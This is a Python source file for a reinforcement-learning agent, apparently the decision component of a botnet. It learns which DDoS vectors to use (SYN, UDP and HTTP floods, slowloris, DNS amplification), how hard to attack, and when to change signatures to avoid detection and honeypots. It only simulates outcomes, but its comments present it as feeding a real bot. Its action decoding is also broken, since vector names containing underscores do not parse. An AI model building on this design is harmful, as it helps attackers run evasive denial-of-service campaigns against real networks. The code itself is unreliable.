#!/usr/bin/env python3
"""
Reinforcement Learning Agent for Adaptive Bot Behavior

This agent learns optimal attack strategies through trial and error:
- State: Current network conditions, detection events, success rates
- Actions: Attack vector selection, timing adjustments, evasion techniques
- Rewards: Successful attacks (+), detections (-), resource efficiency (+)
"""

import numpy as np  # noqa: F401
import json
import logging
from typing import Dict, List, Tuple  # noqa: F401
from dataclasses import dataclass
from collections import deque
import random

logging.basicConfig(level=logging.INFO)
logger = logging.getLogger(__name__)


@dataclass


class BotState:
    """Current state of the bot environment"""
    detection_rate: float          # 0.0 to 1.0
    success_rate: float            # 0.0 to 1.0
    active_connections: int
    packets_sent_per_sec: int
    bandwidth_utilization: float   # 0.0 to 1.0
    time_since_last_detection: int # seconds
    target_response_time: float    # milliseconds
    is_honeypot_suspected: bool


@dataclass


class Action:
    """Action the bot can take"""
    attack_vector: str    # 'tcp_syn', 'udp_flood', 'http_flood', 'slowloris', etc.
    intensity: float      # 0.0 to 1.0
    scan_rate: int        # packets per second
    evasion_level: int    # 0 (none) to 3 (maximum)
    change_signature: bool
    go_dormant: bool


class AdaptiveAgent:
    """
    Q-learning based agent for adaptive bot behavior
    """

    def __init__(self, learning_rate=0.1, discount_factor=0.95, epsilon=0.2):
        self.learning_rate = learning_rate
        self.discount_factor = discount_factor
        self.epsilon = epsilon  # Exploration rate

        # Q-table: maps (state, action) -> expected reward
        self.q_table: Dict[Tuple, Dict[str, float]] = {}

        # Experience replay buffer
        self.memory = deque(maxlen=10000)

        # Statistics
        self.total_rewards = 0
        self.episodes = 0
        self.successful_attacks = 0
        self.detections = 0

        # Available actions
        self.attack_vectors = [
            'tcp_syn', 'tcp_ack', 'udp_flood', 'http_flood',
            'slowloris', 'rudy', 'dns_amplification'
        ]

        logger.info("Adaptive RL agent initialized")

    def state_to_tuple(self, state: BotState) -> Tuple:
        """Convert state to hashable tuple for Q-table"""
        return (
            round(state.detection_rate, 1),
            round(state.success_rate, 1),
            state.active_connections // 50,  # Bucket by 50s
            state.packets_sent_per_sec // 100,
            round(state.bandwidth_utilization, 1),
            state.time_since_last_detection // 60,  # Bucket by minutes
            round(state.target_response_time / 100),  # Bucket by 100ms
            state.is_honeypot_suspected
        )

    def get_action(self, state: BotState, explore: bool = True) -> Action:
        """
        Select action using epsilon-greedy policy

        Args:
            state: Current bot state
            explore: Whether to explore (True) or exploit (False)

        Returns:
            Action to take
        """
        state_tuple = self.state_to_tuple(state)

        # Exploration: random action
        if explore and random.random() < self.epsilon:
            return self._random_action()

        # Exploitation: best known action
        if state_tuple not in self.q_table:
            self.q_table[state_tuple] = {}

        q_values = self.q_table[state_tuple]

        if not q_values:
            return self._random_action()

        # Select action with highest Q-value
        best_action_key = max(q_values.keys(), key=lambda k: q_values[k])
        return self._decode_action(best_action_key)

    def _random_action(self) -> Action:
        """Generate random action for exploration"""
        return Action(
            attack_vector=random.choice(self.attack_vectors),
            intensity=random.uniform(0.3, 1.0),
            scan_rate=random.randint(100, 5000),
            evasion_level=random.randint(0, 3),
            change_signature=random.choice([True, False]),
            go_dormant=False
        )

    def _encode_action(self, action: Action) -> str:
        """Convert action to string key"""
        return f"{action.attack_vector}_{int(action.intensity*10)}_{action.evasion_level}"

    def _decode_action(self, action_key: str) -> Action:
        """Convert string key back to action"""
        parts = action_key.split('_')
        return Action(
            attack_vector=parts[0],
            intensity=float(parts[1]) / 10.0,
            scan_rate=1000,  # Default
            evasion_level=int(parts[2]),
            change_signature=False,
            go_dormant=False
        )

    def calculate_reward(self, state: BotState, action: Action,
                        next_state: BotState) -> float:
        """
        Calculate reward for state transition

        Positive rewards:
        - Successful attacks
        - Low detection rate
        - Efficient resource use

        Negative rewards:
        - Detections
        - Failed attacks
        - Honeypot interaction
        """
        reward = 0.0

        # Success reward
        if next_state.success_rate > state.success_rate:
            reward += (next_state.success_rate - state.success_rate) * 100
            self.successful_attacks += 1

        # Detection penalty
        if next_state.detection_rate > state.detection_rate:
            reward -= (next_state.detection_rate - state.detection_rate) * 200
            self.detections += 1

        # Evasion bonus (time since detection)
        if next_state.time_since_last_detection > state.time_since_last_detection:
            reward += 5

        # Efficiency bonus (high success, low detection)
        if next_state.success_rate > 0.7 and next_state.detection_rate < 0.2:
            reward += 20

        # Honeypot penalty
        if next_state.is_honeypot_suspected:
            reward -= 100

        # Resource efficiency
        if next_state.bandwidth_utilization < 0.8:  # Not maxed out
            reward += 5

        return reward

    def learn(self, state: BotState, action: Action,
             reward: float, next_state: BotState):
        """
        Update Q-table using Q-learning algorithm

        Q(s,a) = Q(s,a) + α[r + γ·max(Q(s',a')) - Q(s,a)]
        """
        state_tuple = self.state_to_tuple(state)
        next_state_tuple = self.state_to_tuple(next_state)
        action_key = self._encode_action(action)

        # Initialize Q-values if needed
        if state_tuple not in self.q_table:
            self.q_table[state_tuple] = {}
        if next_state_tuple not in self.q_table:
            self.q_table[next_state_tuple] = {}

        # Current Q-value
        current_q = self.q_table[state_tuple].get(action_key, 0.0)

        # Maximum Q-value for next state
        next_q_values = self.q_table[next_state_tuple]
        max_next_q = max(next_q_values.values()) if next_q_values else 0.0

        # Q-learning update
        new_q = current_q + self.learning_rate * (
            reward + self.discount_factor * max_next_q - current_q
        )

        self.q_table[state_tuple][action_key] = new_q

        # Store experience
        self.memory.append((state, action, reward, next_state))

        self.total_rewards += reward

        logger.debug(f"Q-update: {action_key} {current_q:.2f} -> {new_q:.2f} (reward: {reward:.2f})")

    def train_episode(self, initial_state: BotState, max_steps: int = 100):
        """
        Run one training episode

        Args:
            initial_state: Starting state
            max_steps: Maximum steps in episode

        Returns:
            Total reward for episode
        """
        state = initial_state
        episode_reward = 0.0

        for step in range(max_steps):
            # Select action
            action = self.get_action(state, explore=True)

            # Simulate next state (in production, this comes from actual bot)
            next_state = self._simulate_next_state(state, action)

            # Calculate reward
            reward = self.calculate_reward(state, action, next_state)

            # Learn from experience
            self.learn(state, action, reward, next_state)

            episode_reward += reward
            state = next_state

            # Early stopping if detected or honeypot
            if next_state.detection_rate > 0.8 or next_state.is_honeypot_suspected:
                break

        self.episodes += 1

        logger.info(f"Episode {self.episodes}: reward={episode_reward:.2f}, "
                   f"steps={step+1}, success_rate={state.success_rate:.2f}")

        return episode_reward

    def _simulate_next_state(self, state: BotState, action: Action) -> BotState:
        """
        Simulate next state based on action (for training)
        In production, this would be real feedback from bot operations
        """
        # Simplified simulation
        next_state = BotState(
            detection_rate=state.detection_rate,
            success_rate=state.success_rate,
            active_connections=state.active_connections,
            packets_sent_per_sec=action.scan_rate,
            bandwidth_utilization=state.bandwidth_utilization,
            time_since_last_detection=state.time_since_last_detection + 1,
            target_response_time=state.target_response_time,
            is_honeypot_suspected=state.is_honeypot_suspected
        )

        # Evasion reduces detection
        if action.evasion_level > 0:
            next_state.detection_rate *= (1.0 - action.evasion_level * 0.1)

        # Intensity affects success but also detection
        if action.intensity > 0.7:
            next_state.success_rate = min(1.0, state.success_rate + 0.1)
            next_state.detection_rate = min(1.0, state.detection_rate + 0.05)
        else:
            next_state.success_rate = max(0.0, state.success_rate - 0.05)
            next_state.detection_rate = max(0.0, state.detection_rate - 0.02)

        # Signature change reduces detection
        if action.change_signature:
            next_state.detection_rate *= 0.7
            next_state.time_since_last_detection = 0

        return next_state

    def get_stats(self) -> Dict:
        """Get agent statistics"""
        return {
            'episodes': self.episodes,
            'total_rewards': self.total_rewards,
            'avg_reward': self.total_rewards / max(1, self.episodes),
            'successful_attacks': self.successful_attacks,
            'detections': self.detections,
            'success_rate': self.successful_attacks / max(1, self.episodes),
            'q_table_size': len(self.q_table),
            'memory_size': len(self.memory)
        }

    def save_model(self, filepath: str):
        """Save Q-table to file"""
        # Convert to serializable format
        serializable_q_table = {
            str(k): v for k, v in self.q_table.items()
        }

        data = {
            'q_table': serializable_q_table,
            'stats': self.get_stats(),
            'hyperparameters': {
                'learning_rate': self.learning_rate,
                'discount_factor': self.discount_factor,
                'epsilon': self.epsilon
            }
        }

        with open(filepath, 'w') as f:
            json.dump(data, f, indent=2)

        logger.info(f"Model saved to {filepath}")

    def load_model(self, filepath: str):
        """Load Q-table from file"""
        with open(filepath, 'r') as f:
            data = json.load(f)

        # Convert back to tuple keys
        # SECURITY FIX: Use ast.literal_eval instead of eval to prevent code injection
        import ast
        self.q_table = {
            ast.literal_eval(k): v for k, v in data['q_table'].items()
        }

        logger.info(f"Model loaded from {filepath}")


# Example usage
if __name__ == '__main__':
    agent = AdaptiveAgent()

    # Training loop
    print("Training adaptive agent...")

    for episode in range(100):
        initial_state = BotState(
            detection_rate=random.uniform(0.1, 0.3),
            success_rate=random.uniform(0.3, 0.6),
            active_connections=random.randint(50, 200),
            packets_sent_per_sec=1000,
            bandwidth_utilization=0.5,
            time_since_last_detection=300,
            target_response_time=50.0,
            is_honeypot_suspected=False
        )

        agent.train_episode(initial_state, max_steps=50)

    # Print statistics
    stats = agent.get_stats()
    print("\n" + "="*50)
    print("Training Results:")
    print("="*50)
    for key, value in stats.items():
        print(f"{key}: {value}")

    # Save model
    agent.save_model('/tmp/adaptive_agent.json')

    # Test exploitation (no exploration)
    print("\n" + "="*50)
    print("Testing learned policy (exploitation only):")
    print("="*50)

    test_state = BotState(
        detection_rate=0.2,
        success_rate=0.5,
        active_connections=100,
        packets_sent_per_sec=1000,
        bandwidth_utilization=0.6,
        time_since_last_detection=600,
        target_response_time=75.0,
        is_honeypot_suspected=False
    )

    best_action = agent.get_action(test_state, explore=False)
    print(f"Best action for given state:")  # noqa: F541
    print(f"  Attack Vector: {best_action.attack_vector}")
    print(f"  Intensity: {best_action.intensity:.2f}")
    print(f"  Evasion Level: {best_action.evasion_level}")
